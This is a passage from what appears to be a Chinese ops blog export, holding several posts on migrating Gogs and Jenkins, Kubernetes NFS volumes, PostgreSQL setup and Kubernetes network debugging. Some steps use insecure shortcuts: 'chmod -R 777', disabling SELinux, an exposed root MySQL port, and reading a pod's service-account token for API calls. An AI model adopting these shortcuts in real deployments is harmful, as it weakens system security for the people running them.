tar zcf gogs.tar.gz gogs $ tar zcf gogs-repositories.tar.gz gogs-repositories $ scp gogs.tar.gz newhost:/data/gogs $ scp gogs-repositories.tar.gz newhost:/data/gogs ## gogs的数据文件 $ mysqldump -uroot -h\u0026#39;127.0.0.1\u0026#39; -ppassword --databases gogs \u0026gt; gogs.sql $ scp gogs.sql newhost:/data/gogs  目录结构如下：  $ mkdir /data/gogs/{data,mysql} -p $ cd /data/gogs ## 文件结构如下 $ tree -L 1 . ├── data ├── docker-compose.yaml └── mysql  基于docker-compose部署gogs  编写docker-compose.yaml文件，如下：\n$ cat docker-compose.yaml version: \u0026#39;2\u0026#39; services: gogsdb: container_name: gogsdb volumes: - \u0026#34;/data/gogs/mysql:/var/lib/mysql\u0026#34; restart: always ports: - \u0026#34;3306:3306\u0026#34; environment: MYSQL_ROOT_PASSWORD: $yourpassword MYSQL_DATABASE: gogs MYSQL_USER: root MYSQL_PASSWORD: $yourpassword gogs: container_name: gogs depends_on: - gogsdb volumes: - /data/gogs/data:/data links: - gogsdb ports: - \u0026#34;10080:3000\u0026#34; - \u0026#34;22:22\u0026#34; restart: always 导入数据库文件  启动服务导入数据,然后进入安装页面  ## 1. 启动服务 $ cd /data/gogs $ docker-compose up ### 这里建议先不使用-d，选择查看启动日志，是否由报错，基本不会报错，等待mysql数据库生成好文件，大概几秒钟的时间。 ## 2. 导入mysql数据库 $ mysql -p$yourpassword \u0026lt; gogs.sql 安装页面初始化 如果直接把你以前的配置导入，会有500的internel报错，具体原因我也没找到。所以这里博主采用先安装初始化，然后直接更改配置文件的方法。具体初始话可以看我上篇gogs安装\n 注意事项 安装的数据库填写自己docker-compose.yaml文件的数据库主机gogsdb:3306和密码. 应用的基本设置安装app.ini文件填写，也可以随便填写，后面需要可以把以前的配置文件按需复制 管理员配置直接跳过，因为数据库里面的数据已经存在了管理员，如果你需要重置管理员，那自己随意。   点击跳过管理员后，直接会跳转到登陆界面，登陆，用户名密码为你前系统的用户名密码，没有改变。可能这里有人会说，你的repo数据还没有导入呢，对，这点击进入的任何repo有关的都是报的500，找不到。  导入repo仓库数据 $ cd /data/gogs/ $ tar xf gogs-repositories.tar.gz $ cp -rf /data/gogs/gogs-repositories /data/gogs/data/git/gogs-repositories ## 重启gogs服务 $ docker-compose up -d --force ## 做到这一步基本网页访问正常，git pull没有问题了，本地只需要改一下repo地址就可以完美迁移完毕。 突然来的问题 push error, the hooks/update path is not config file path 在git pull没有问题的情况，博主就点了一杯奶茶，喝了几口压压惊。不一会，就有小伙伴跑过来说git push用不了，这让我心头一沉，怎么回事，docker部署哪里由问题么，赶紧放下刚润嗓子的奶茶，就查起问题。\n$ git push origin hotfix_xxxx_xxxx remote: hooks/update: line 2: /app/gogs/gogs: No such file or directory remote: error: hook declined to update refs/heads/master ... pre-receive hook declined google大法好,这里参照了push error, the hooks/update path is not config file path这个方法解决的。\n主要原因是:\nI suppose you copied the repositories from another Gogs installation. Go to admin dashboard and do: 22端口为git的访问失败 用户在用户设置\u0026ndash;\u0026gt;ssh 密钥设置中添加自己的ssh公钥\n却发现还是不能git clone或者git pull\n1. 22端口被防火墙封禁，打开22端口即可 $ ssh -T git@fenghong.tech ssh_exchange_identification: read: Connection reset by peer 2. permission deny $ ssh -T git@fenghong.tech Permission denied (publickey,keyboard-interactive). ## 解决，进入容器查看git用户的authorized_keys文件权限。 $ docker exec -it gogs bash bash-5.0# bash-5.0# cd /home/git/.ssh/ bash-5.0# ls -la total 16 drwx------ 2 git git 4096 Sep 10 07:47 . drwxr-xr-x 4 git git 4096 Sep 10 08:07 .. -rwxr-xr-x 1 git git 860 Sep 10 07:47 authorized_keys -rwxr-xr-x 1 git git 23 Sep 10 03:48 environment bash-5.0# chmod 600 * 3. 验证，可以正常使用git了。 $ ssh -T git@fenghong.tech Hi there, You\u0026#39;ve successfully authenticated, but Gogs does not provide shell access. If this is unexpected, please log in with password and setup Gogs under another user. 参考  无闻大佬  ","permalink":"https://www.fenghong.tech/blog/ops/gogs-repo-move-to-annother-host/","tags":["git","gogs","docker"],"title":"Gogs仓库迁移"},{"categories":["ops","jenkins"],"contents":"[TOC]\n 背景 公司服务器缩减，运维平台迁移，以前的项目得一个一个迁移，比如gogs仓库迁移，jenkins迁移，sonarqube迁移，gogs迁移过程算是幸运，从阿里云迁移至ucloud，包括打包仓库，错误处理，总共花费2小时。在此记录一下jenkins迁移记录，后续的迁移也会一一记录的。\n# 表示注释， $ 表示shell \n 服务器迁移准备 迁移思路  做好数据备份，包括/var/lib/jenkins数据文件的重要备份。 scp或者stfp将打包的文件转移至新服务器。 由于老版本是基于宿主机部署的，各个文件比较分散，这次转移采用docker-compose部署。快捷方便，一旦错误，可以快速定位，可以形成一个包。 启动程序快速定位问题，学会查看日志，学会google大法。  部署  备份，转移操作。  ## jenkins $ cd /var/lib/jenkins $ tar zcf jenkins.tar.gz jenkins $ scp -P6822 jenkins.tar.gz myhost:/data/jenkins  目录结构如下：  $ mkdir /data/jenkins/data $ touch docker-compose.yaml $ tree -L 1 . ├── data └── docker-compose.yaml  基于docker-compose部署：  version: \u0026#39;2\u0026#39; services: jenkins: container_name: jenkins restart: always ports: - 18000:8080 - 50000:50000 volumes: - /data/jenkins/data:/var/jenkins_home  导入数据文件  $ cd /data/jenkins $ tar zcf jenkins.tar.gz $ mv jenkins/users data/ $ mv jenkins/plugins data/ $ mv jenkins/config.xml data/ $ mv jenkins/jobs data/ $ mv jenkins/workspace data/  部署  ## 调式的时候去掉-d,便于观察日志是否有报错信息,根据报错信息依次解决. $ docker-compose up -d ## 如果去权限错误,记得chown 修改为docker的启动用户权限;实在不777大法 $ chmod -R 777 data/  创建ssh密钥，可以远程部署,这个主要是原来的ssh秘钥密码忘记了,所以重新弄了~~  ## (一路enter，记得要使用密码) $ ssh-keggen $ ls ~/.ssh/ id_rsa id_rsa.pub ## 将此密钥作为jenkins，连接远程主机执行shell脚本，实现pipeline自动化。 ## 具体原理请查阅ssh原理，这里不再赘述. 总结 jenkins的部署相对简单,主要是一些插件的使用比较繁琐,需要慢慢的学习.这次迁移基本没有什么报错,一路成功.\n参考  jenkins迁移  ","permalink":"https://www.fenghong.tech/blog/ops/jenkins-move-to-annother-host/","tags":["git","jenkins","docker"],"title":"jenkins自动化发布工具迁移"},{"categories":["kubernetes"],"contents":"[TOC]\n k8s提供了emptyDir,hostPath,rbd,cephfs等存储方式供容器使用,不过这些存储方式都有一个缺点:开发人员必须得知指定存储的相关配置信息,才能使用存储.例如要使用cephfs,Pod的配置信息就必须指明cephfs的monitor,user,selectFile等等,而这些应该是系统管理员的工作.对此,k8s提供了两个新的API资源:PersistentVolume,PersistentVolumeClaim\n   PV(PersistentVolume)是管理员已经提供好的一块存储.在k8s集群中,PV像Node一样,是一个资源\n  PVC(PersistentVolumeClaim)是用户对PV的一次申请.PVC对于PV就像Pod对于Node一样,Pod可以申请CPU和Memory资源,而PVC也可以申请PV的大小与权限\n  有了PersistentVolumeClaim,用户只需要告诉Kubernetes需要什么样的存储资源,而不必关心真正的空间从哪里分配,如何访问等底层细节信息;这些Storage Provider的底层信息交给管理员来处理,只有管理员才应该关心创建PersistentVolume的细节信息.\n  基于NFS创建动态的pv NFS 创建NFS服务端 安装nfs-tuils, ubuntu系统安装nfs-common\nyum install nfs-utils systemctl enable nfs systemctl enable rpcbind systemctl start rpcbind nfs 配置nfs共享目录,/data/k8s/nfs,具体含义看我当时写的一篇nfs文档\nvim /etc/exports /data/k8s/nfs 10.9.0.0/16(no_root_squash,rw,sync,no_subtree_check) 重启服务\nsystemctl restart rpcbind nfs 客户端配置 客户端需要安装nfs-utils,否则nfs挂载会一直pending,导致pvc分配失败.\n## centos yum install nfs-utils ## ubuntu sudo apt-get install nfs-common 配置动态nfs-client 此次配置均参考Kubernetes NFS-Client Provisioner\nnfs-client-provisioner 是一个Kubernetes的简易NFS的外部provisioner，本身不提供NFS，需要现有的NFS服务器提供存储\n PV以 ${namespace}-${pvcName}-${pvName}的命名格式提供（在NFS服务器上） PV回收的时候以 archieved-${namespace}-${pvcName}-${pvName} 的命名格式（在NFS服务器上）  部署nfs-client-provisioner 修改deployment文件并部署 ,需要修改的地方只有NFS服务器所在的IP地址和挂载目录.\n$ cat deployment.yaml --- kind: Deployment apiVersion: apps/v1 metadata: name: nfs-client-provisioner labels: app: nfs-client-provisioner spec: replicas: 1 strategy: type: Recreate selector: matchLabels: app: nfs-client-provisioner template: metadata: labels: app: nfs-client-provisioner spec: serviceAccountName: nfs-client-provisioner containers: - name: nfs-client-provisioner image: eipwork/nfs-client-provisioner:v3.1.0-k8s1.11 volumeMounts: - name: nfs-client-root mountPath: /persistentvolumes env: - name: PROVISIONER_NAME value: fuseim.pri/ifs ## 可以按需更改,换成自定义的,必须配合class.yaml - name: NFS_SERVER value: 192.168.160.243 ## NFS服务器所在的IP地址 - name: NFS_PATH value: /data/k8s/nfs ## NFS服务器所在的共享目录 volumes: - name: nfs-client-root nfs: server: 192.168.160.243 ## NFS服务器所在的IP地址 path: /data/k8s/nfs ## NFS服务器所在的共享目录 执行apply即可\n kubectl apply -f deployment.yam  class.yaml  修改StorageClass文件并部署\napiVersion: storage.k8s.io/v1 kind: StorageClass metadata: name: managed-nfs-storage provisioner: fuseim.pri/ifs ## 可以按需更改,换成自定义的,必须配合deployment.yaml parameters: archiveOnDelete: \u0026quot;false\u0026quot; 授权  rbac.yaml  apiVersion: v1 kind: ServiceAccount metadata: name: nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default --- kind: ClusterRole apiVersion: rbac.authorization.k8s.io/v1 metadata: name: nfs-client-provisioner-runner rules: - apiGroups: [\u0026quot;\u0026quot;] resources: [\u0026quot;persistentvolumes\u0026quot;] verbs: [\u0026quot;get\u0026quot;, \u0026quot;list\u0026quot;, \u0026quot;watch\u0026quot;, \u0026quot;create\u0026quot;, \u0026quot;delete\u0026quot;] - apiGroups: [\u0026quot;\u0026quot;] resources: [\u0026quot;persistentvolumeclaims\u0026quot;] verbs: [\u0026quot;get\u0026quot;, \u0026quot;list\u0026quot;, \u0026quot;watch\u0026quot;, \u0026quot;update\u0026quot;] - apiGroups: [\u0026quot;storage.k8s.io\u0026quot;] resources: [\u0026quot;storageclasses\u0026quot;] verbs: [\u0026quot;get\u0026quot;, \u0026quot;list\u0026quot;, \u0026quot;watch\u0026quot;] - apiGroups: [\u0026quot;\u0026quot;] resources: [\u0026quot;events\u0026quot;] verbs: [\u0026quot;create\u0026quot;, \u0026quot;update\u0026quot;, \u0026quot;patch\u0026quot;] --- kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1 metadata: name: run-nfs-client-provisioner subjects: - kind: ServiceAccount name: nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default roleRef: kind: ClusterRole name: nfs-client-provisioner-runner apiGroup: rbac.authorization.k8s.io --- kind: Role apiVersion: rbac.authorization.k8s.io/v1 metadata: name: leader-locking-nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default rules: - apiGroups: [\u0026quot;\u0026quot;] resources: [\u0026quot;endpoints\u0026quot;] verbs: [\u0026quot;get\u0026quot;, \u0026quot;list\u0026quot;, \u0026quot;watch\u0026quot;, \u0026quot;create\u0026quot;, \u0026quot;update\u0026quot;, \u0026quot;patch\u0026quot;] --- kind: RoleBinding apiVersion: rbac.authorization.k8s.io/v1 metadata: name: leader-locking-nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default subjects: - kind: ServiceAccount name: nfs-client-provisioner # replace with namespace where provisioner is deployed namespace: default roleRef: kind: Role name: leader-locking-nfs-client-provisioner apiGroup: rbac.authorization.k8s.io 如果启用了RBAC,则执行\nkubectl apply -f rbac.yaml 测试 查看test.yaml\n--- kind: PersistentVolumeClaim apiVersion: v1 metadata: name: test-claim spec: accessModes: - ReadWriteMany resources: requests: storage: 1Mi kind: Pod apiVersion: v1 metadata: name: test-pod spec: containers: - name: test-pod command: - \u0026quot;/bin/sh\u0026quot; args: - \u0026quot;-c\u0026quot; - \u0026quot;touch /mnt/SUCCESS \u0026amp;\u0026amp; exit 0 || exit 1\u0026quot; volumeMounts: - name: nfs-pvc mountPath: \u0026quot;/mnt\u0026quot; restartPolicy: \u0026quot;Never\u0026quot; volumes: - name: nfs-pvc persistentVolumeClaim: claimName: test-claim  执行  $ kubectl apply -f test.yaml pod/test-pod created persistentvolumeclaim/test-claim created 查看pvc和pod状态\n$ kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE test-claim Bound pvc-ff0ee478-adf9-47a7-b376-d1a9edfd3046 1Mi RWX managed-nfs-storage 5m8s 验证:\n$ cd /data/k8s/nfs/default-test-claim-pvc-ff0ee478-adf9-47a7-b376-d1a9edfd3046/ $ ls SUCCESS 删除pvc,会生成archived\n$ kubectl delete -f test.yaml persistentvolumeclaim \u0026quot;test-claim\u0026quot; deleted pod \u0026quot;test-pod\u0026quot; deleted $ ls /data/k8s/nfs/archived-default-test-claim-pvc-ff0ee478-adf9-47a7-b376-d1a9edfd3046/SUCCESS /data/k8s/nfs/archived-default-test-claim-pvc-ff0ee478-adf9-47a7-b376-d1a9edfd3046/SUCCESS 报错相关  错误1.一直处于pending状态,由于k8s集群的其他客户端未安装nfs-utils,安装即可  $ kubectl get pvc |grep test NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE test-claim Pending managed-nfs-storage 5m8s  错误2.镜像 ImagePullBackOff错误  $ kubectl get pods |grep test test-pod 0/1 ImagePullBackOff 0 3m49s # gcr.io处于不可描述的状态 # 使用镜像然后tag即可,或者使用dockerhub上的镜像也可以.这就需要修改test.yaml $ docker pull gcr.azk8s.cn/google_containers/busybox:1.24 $ docker tag gcr.azk8s.cn/google_containers/busybox:1.24 gcr.io/google_containers/busybox:1.24 参考  jimmysong.io大佬  ","permalink":"https://www.fenghong.tech/blog/kubernetes/kubeadm-pvc/","tags":["pv","nfs","pvc","kubernetes"],"title":"kuberbetes 基于nfs的pvc"},{"categories":["ops"],"contents":"[TOC]\n配置OS资源限制 # vi /etc/security/limits.conf * soft nofile 1024000 * hard nofile 1024000 * soft nproc unlimited * hard nproc unlimited * soft core unlimited * hard core unlimited * soft memlock unlimited * hard memlock unlimited 关闭 SELinux 关闭 SELinux，否则后续引起不必要的麻烦：\nsetenforce 0 sed -i \u0026#39;s/^SELINUX=.*/SELINUX=disabled/\u0026#39; /etc/selinux/config 下载源码二进制文件 官方的地址:https://www.postgresql.org/download/linux/ubuntu/\nwget http://get.enterprisedb.com/postgresql/postgresql-9.4.24-1-linux-x64-binaries.tar.gz # 解压到/data目录 tar xf postgresql-9.4.24-1-linux-x64-binaries.tar.gz -C /data/  配置环境变量  export PG_INSTALL_DIR=\u0026#34;/data/pgsql\u0026#34; export PG_DATA_DIR=\u0026#34;/data/pgdata\u0026#34; export PATH=$PG_INSTALL_DIR/bin:$PATH 配置启动脚本 #!/bin/bash  set -e set -u # chkconfig: 2345 98 02 # description: PostgreSQL RDBMS # where to find commands like su, echo, etc... PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin DB_ENCODING=SQL_ASCII DB_LOCALE=C PG_INSTALL_DIR=\u0026#34;/data/pgsql\u0026#34; PG_DATA_DIR=\u0026#34;/data/pgdata\u0026#34; PG_SERVER_LOG=\u0026#34;$PG_DATA_DIR/serverlog\u0026#34; PG_UNIX_USER=postgres POSTGRES=\u0026#34;$PG_INSTALL_DIR/bin/postgres\u0026#34; PG_CTL=\u0026#34;$PG_INSTALL_DIR/bin/pg_ctl\u0026#34; INITDB=\u0026#34;$PG_INSTALL_DIR/bin/initdb\u0026#34; # die on first failure; do not keep trucking set -e if [ $# -ne 1 ]; then echo \u0026#34;please enter start/stop/restart etc...\u0026#34; 1\u0026gt;\u0026amp;2 exit 1 fi # Only start if we can find postgres and pg_ctl. if [ ! -x $PG_CTL ]; then echo \u0026#34;$PG_CTLnot found\u0026#34; 1\u0026gt;\u0026amp;2 exit 1 fi if [ ! -x $POSTGRES ]; then echo \u0026#34;$POSTGRESnot found\u0026#34; 1\u0026gt;\u0026amp;2 exit 1 fi case $1 in init) su - $PG_UNIX_USER -c \u0026#34;$INITDB--pgdata=\u0026#39;$PG_DATA_DIR\u0026#39; --encoding=$DB_ENCODING--locale=$DB_LOCALE\u0026#34; ;; start) echo -n \u0026#34;Starting PostgreSQL: \u0026#34; su - $PG_UNIX_USER -c \u0026#34;$PG_CTLstart -D \u0026#39;$PG_DATA_DIR\u0026#39; -l $PG_SERVER_LOG\u0026#34; echo \u0026#34;ok\u0026#34; ;; stop) echo -n \u0026#34;Stopping PostgreSQL: \u0026#34; su - $PG_UNIX_USER -c \u0026#34;$PG_CTLstop -D \u0026#39;$PG_DATA_DIR\u0026#39; -s -m fast\u0026#34; echo \u0026#34;ok\u0026#34; ;; restart) echo -n \u0026#34;Restarting PostgreSQL: \u0026#34; su - $PG_UNIX_USER -c \u0026#34;$PG_CTLstop -D \u0026#39;$PG_DATA_DIR\u0026#39; -s -m fast -w\u0026#34; su - $PG_UNIX_USER -c \u0026#34;$PG_CTLstart -D \u0026#39;$PG_DATA_DIR\u0026#39; -l $PG_SERVER_LOG\u0026#34; echo \u0026#34;ok\u0026#34; ;; reload) echo -n \u0026#34;Reload PostgreSQL: \u0026#34; su - $PG_UNIX_USER -c \u0026#34;$PG_CTLreload -D \u0026#39;$PG_DATA_DIR\u0026#39; -s\u0026#34; echo \u0026#34;ok\u0026#34; ;; status) su - $PG_UNIX_USER -c \u0026#34;$PG_CTLstatus -D \u0026#39;$PG_DATA_DIR\u0026#39;\u0026#34; ;; *) # Print help echo \u0026#34;Usage: $0{start|stop|restart|reload|status}\u0026#34; 1\u0026gt;\u0026amp;2 exit 1 ;; esac exit 0 总结 公司的区块链项目用到postgresql这个数据来进行存储,用到了,就绪学习他的相关维护和安装,启动等;这次的部署也算是记录一下吧,下次有机会写点用法.\n参考  布比区块链  ","permalink":"https://www.fenghong.tech/blog/ops/postgresql-install/","tags":["sql","ubuntu"],"title":"ubuntu安装postgresql"},{"categories":["kubernetes"],"contents":"[TOC]\n转载知乎大佬 知乎专栏\n本文介绍各种常见的网络问题以及排错方法，包括 Pod 访问异常、Service 访问异常以及网络安全策略异常等。\n说到 Kubernetes 的网络，其实无非就是以下三种情况之一\n Pod 访问容器外部网络 从容器外部访问 Pod 网络 Pod 之间相互访问  当然，以上每种情况还都分别包括本地访问和跨主机访问两种场景，并且一般情况下都是通过 Service 间接访问 Pod。\n排查网络问题基本上也是从这几种情况出发，定位出具体的网络异常点，再进而寻找解决方法。网络异常可能的原因比较多，常见的有\n  CNI 网络插件配置错误，导致多主机网络不通，比如\n    IP 网段与现有网络冲突\n  插件使用了底层网络不支持的协议\n  忘记开启 IP 转发等\n   sysctl net.ipv4.ip_forward sysctl net.bridge.bridge-nf-call-iptables      Pod 网络路由丢失，比如\n   kubenet 要求网络中有 podCIDR 到主机 IP 地址的路由，这些路由如果没有正确配置会导致 Pod 网络通信等问题 在公有云平台上，kube-controller-manager 会自动为所有 Node 配置路由，但如果配置不当（如认证授权失败、超出配额等），也有可能导致无法配置路由    主机内或者云平台的安全组、防火墙或者安全策略等阻止了 Pod 网络，比如\n   非 Kubernetes 管理的 iptables 规则禁止了 Pod 网络 公有云平台的安全组禁止了 Pod 网络（注意 Pod 网络有可能与 Node 网络不在同一个网段） 交换机或者路由器的 ACL 禁止了 Pod 网络    Flannel Pods 一直处于 Init:CrashLoopBackOff 状态 Flannel 网络插件非常容易部署，只要一条命令即可\nkubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml 然而，部署完成后，Flannel Pod 有可能会碰到初始化失败的错误\n$ kubectl -n kube-system get pod NAME READY STATUS RESTARTS AGE kube-flannel-ds-ckfdc 0/1 Init:CrashLoopBackOff 4 2m kube-flannel-ds-jpp96 0/1 Init:CrashLoopBackOff 4 2m 查看日志会发现\n$ kubectl -n kube-system logs kube-flannel-ds-jpp96 -c install-cni cp: can\u0026#39;t create \u0026#39;/etc/cni/net.d/10-flannel.conflist\u0026#39;: Permission denied 这一般是由于 SELinux 开启导致的，关闭 SELinux 既可解决。有两种方法：\n 修改 /etc/selinux/config 文件方法：SELINUX=disabled 通过命令临时修改（重启会丢失）：setenforce 0  Pod 无法解析 DNS 如果 Node 上安装的 Docker 版本大于 1.12，那么 Docker 会把默认的 iptables FORWARD 策略改为 DROP。这会引发 Pod 网络访问的问题。解决方法则在每个 Node 上面运行 iptables -P FORWARD ACCEPT，比如\necho \u0026#34;ExecStartPost=/sbin/iptables -P FORWARD ACCEPT\u0026#34; \u0026gt;\u0026gt; /etc/systemd/system/docker.service.d/exec_start.conf systemctl daemon-reload systemctl restart docker 如果使用了 flannel/weave 网络插件，更新为最新版本也可以解决这个问题。\nDNS 无法解析也有可能是 kube-dns 服务异常导致的，可以通过下面的命令来检查 kube-dns 是否处于正常运行状态\n$ kubectl get pods --namespace=kube-system -l k8s-app=kube-dns NAME READY STATUS RESTARTS AGE ... kube-dns-v19-ezo1y 3/3 Running 0 1h ... 如果 kube-dns 处于 CrashLoopBackOff 状态，那么可以参考 Kube-dns/Dashboard CrashLoopBackOff 排错 来查看具体排错方法。\n如果 kube-dns Pod 处于正常 Running 状态，则需要进一步检查是否正确配置了 kube-dns 服务：\n$ kubectl get svc kube-dns --namespace=kube-system NAME CLUSTER-IP EXTERNAL-IP PORT(S) AGE kube-dns 10.0.0.10 \u0026lt;none\u0026gt; 53/UDP,53/TCP 1h $ kubectl get ep kube-dns --namespace=kube-system NAME ENDPOINTS AGE kube-dns 10.180.3.17:53,10.180.3.17:53 1h 如果 kube-dns service 不存在，或者 endpoints 列表为空，则说明 kube-dns service 配置错误，可以重新创建 kube-dns service，比如\napiVersion: v1 kind: Service metadata: name: kube-dns namespace: kube-system labels: k8s-app: kube-dns kubernetes.io/cluster-service: \u0026#34;true\u0026#34; kubernetes.io/name: \u0026#34;KubeDNS\u0026#34; spec: selector: k8s-app: kube-dns clusterIP: 10.0.0.10 ports: - name: dns port: 53 protocol: UDP - name: dns-tcp port: 53 protocol: TCP Service 无法访问 访问 Service ClusterIP 失败时，可以首先确认是否有对应的 Endpoints\nkubectl get endpoints \u0026lt;service-name\u0026gt; 如果该列表为空，则有可能是该 Service 的 LabelSelector 配置错误，可以用下面的方法确认一下\n# 查询 Service 的 LabelSelector kubectl get svc \u0026lt;service-name\u0026gt; -o jsonpath=\u0026#39;{.spec.selector}\u0026#39; # 查询匹配 LabelSelector 的 Pod kubectl get pods -l key1=value1,key2=value2 如果 Endpoints 正常，可以进一步检查\n Pod 的 containerPort 与 Service 的 containerPort 是否对应 直接访问 podIP:containerPort 是否正常  再进一步，即使上述配置都正确无误，还有其他的原因会导致 Service 无法访问，比如\n Pod 内的容器有可能未正常运行或者没有监听在指定的 containerPort 上 CNI 网络或主机路由异常也会导致类似的问题 kube-proxy 服务有可能未启动或者未正确配置相应的 iptables 规则，比如正常情况下名为 hostnames的服务会配置以下 iptables 规则  $ iptables-save | grep hostnames -A KUBE-SEP-57KPRZ3JQVENLNBR -s 10.244.3.6/32 -m comment --comment \u0026#34;default/hostnames:\u0026#34; -j MARK --set-xmark 0x00004000/0x00004000 -A KUBE-SEP-57KPRZ3JQVENLNBR -p tcp -m comment --comment \u0026#34;default/hostnames:\u0026#34; -m tcp -j DNAT --to-destination 10.244.3.6:9376 -A KUBE-SEP-WNBA2IHDGP2BOBGZ -s 10.244.1.7/32 -m comment --comment \u0026#34;default/hostnames:\u0026#34; -j MARK --set-xmark 0x00004000/0x00004000 -A KUBE-SEP-WNBA2IHDGP2BOBGZ -p tcp -m comment --comment \u0026#34;default/hostnames:\u0026#34; -m tcp -j DNAT --to-destination 10.244.1.7:9376 -A KUBE-SEP-X3P2623AGDH6CDF3 -s 10.244.2.3/32 -m comment --comment \u0026#34;default/hostnames:\u0026#34; -j MARK --set-xmark 0x00004000/0x00004000 -A KUBE-SEP-X3P2623AGDH6CDF3 -p tcp -m comment --comment \u0026#34;default/hostnames:\u0026#34; -m tcp -j DNAT --to-destination 10.244.2.3:9376 -A KUBE-SERVICES -d 10.0.1.175/32 -p tcp -m comment --comment \u0026#34;default/hostnames: cluster IP\u0026#34; -m tcp --dport 80 -j KUBE-SVC-NWV5X2332I4OT4T3 -A KUBE-SVC-NWV5X2332I4OT4T3 -m comment --comment \u0026#34;default/hostnames:\u0026#34; -m statistic --mode random --probability 0.33332999982 -j KUBE-SEP-WNBA2IHDGP2BOBGZ -A KUBE-SVC-NWV5X2332I4OT4T3 -m comment --comment \u0026#34;default/hostnames:\u0026#34; -m statistic --mode random --probability 0.50000000000 -j KUBE-SEP-X3P2623AGDH6CDF3 -A KUBE-SVC-NWV5X2332I4OT4T3 -m comment --comment \u0026#34;default/hostnames:\u0026#34; -j KUBE-SEP-57KPRZ3JQVENLNBR Pod 无法通过 Service 访问自己 这通常是 hairpin 配置错误导致的，可以通过 Kubelet 的 --hairpin-mode 选项配置，可选参数包括 \u0026ldquo;promiscuous-bridge\u0026rdquo;、\u0026ldquo;hairpin-veth\u0026rdquo; 和 \u0026ldquo;none\u0026rdquo;（默认为\u0026quot;promiscuous-bridge\u0026rdquo;）。\n对于 hairpin-veth 模式，可以通过以下命令来确认是否生效\n$ for intf in /sys/devices/virtual/net/cbr0/brif/*; do cat $intf/hairpin_mode; done 1 1 1 1 而对于 promiscuous-bridge 模式，可以通过以下命令来确认是否生效\n$ ifconfig cbr0 |grep PROMISC UP BROADCAST RUNNING PROMISC MULTICAST MTU:1460 Metric:1 无法访问 Kubernetes API 很多扩展服务需要访问 Kubernetes API 查询需要的数据（比如 kube-dns、Operator 等）。通常在 Kubernetes API 无法访问时，可以首先通过下面的命令验证 Kubernetes API 是正常的：\n$ kubectl run curl --image=appropriate/curl -i -t --restart=Never --command -- sh If you don\u0026#39;t see a command prompt, try pressing enter. / # / # KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) / # curl -sSk -H \u0026#34;Authorization: Bearer $KUBE_TOKEN\u0026#34; https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/default/pods { \u0026#34;kind\u0026#34;: \u0026#34;PodList\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;v1\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;selfLink\u0026#34;: \u0026#34;/api/v1/namespaces/default/pods\u0026#34;, \u0026#34;resourceVersion\u0026#34;: \u0026#34;2285\u0026#34; }, \u0026#34;items\u0026#34;: [ ... ] } 如果出现超时错误，则需要进一步确认名为 kubernetes 的服务以及 endpoints 列表是正常的：\n$ kubectl get service kubernetes NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes ClusterIP 10.96.0.1 \u0026lt;none\u0026gt; 443/TCP 25m $ kubectl get endpoints kubernetes NAME ENDPOINTS AGE kubernetes 172.17.0.62:6443 25m 然后可以直接访问 endpoints 查看 kube-apiserver 是否可以正常访问。无法访问时通常说明 kube-apiserver 未正常启动，或者有防火墙规则阻止了访问。\n但如果出现了 403 - Forbidden 错误，则说明 Kubernetes 集群开启了访问授权控制（如 RBAC），此时就需要给 Pod 所用的 ServiceAccount 创建角色和角色绑定授权访问所需要的资源。比如 CoreDNS 就需要创建以下 ServiceAccount 以及角色绑定：\n# 1. service account apiVersion: v1 kind: ServiceAccount metadata: name: coredns namespace: kube-system labels: kubernetes.io/cluster-service: \u0026#34;true\u0026#34; addonmanager.kubernetes.io/mode: Reconcile --- # 2. cluster role apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: labels: kubernetes.io/bootstrapping: rbac-defaults addonmanager.kubernetes.io/mode: Reconcile name: system:coredns rules: - apiGroups: - \u0026#34;\u0026#34; resources: - endpoints - services - pods - namespaces verbs: - list - watch --- # 3. cluster role binding apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: annotations: rbac.authorization.kubernetes.io/autoupdate: \u0026#34;true\u0026#34; labels: kubernetes.io/bootstrapping: rbac-defaults addonmanager.kubernetes.io/mode: EnsureExists name: system:coredns roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: system:coredns subjects: - kind: ServiceAccount name: coredns namespace: kube-system --- # 4. use created service account apiVersion: extensions/v1beta1 kind: Deployment metadata: name: coredns namespace: kube-system labels: k8s-app: coredns kubernetes.io/cluster-service: \u0026#34;true\u0026#34; addonmanager.kubernetes.io/mode: Reconcile kubernetes.io/name: \u0026#34;CoreDNS\u0026#34; spec: replicas: 2 selector: matchLabels: k8s-app: coredns template: metadata: labels: k8s-app: coredns spec: serviceAccountName: coredns ...  欢迎关注《Kubernetes指南》开源书。\n参考文档  Troubleshoot Applications Debug Services  ","permalink":"https://www.fenghong.tech/blog/kubernetes/kubeadm-network-debug/","tags":["network","kubernetes","flannel"],"title":"kuberbetes 网络排错"},{"categories":["algorithm","golang"],"contents":"[TOC]\n 多项式链表的结构和接口均参考严蔚敏老师的（c语言版）《数据结构》。\n 网上的基本都是C/C++语言实现.这里用golang实现,算法和数据结构,其实用什么编程语言实现都一样,因为思想是一样的, go的话,不用处理free还有malloc等操作细节.\n数据结构\ntype PolyNode struct { coef int //系数 exp int // 指数 next *PolyNode //指针 } 加法实现思想 p,q 为多项式A和B当前进行比较的某计算节点; rear为指向\u0026quot;和多项式\u0026quot;链表的尾节点 p.exp \u0026lt; q.exp ; 将当前p节点加入到和节点的rear,p后移 p.exp = q.exp ; 和为0,A中删除p,释放p,q;和不为零,修改p的数据域,释放q节点 p.exp \u0026gt; q.exp ; q节点插入p之前,q节点的指针在原来的链表上后移 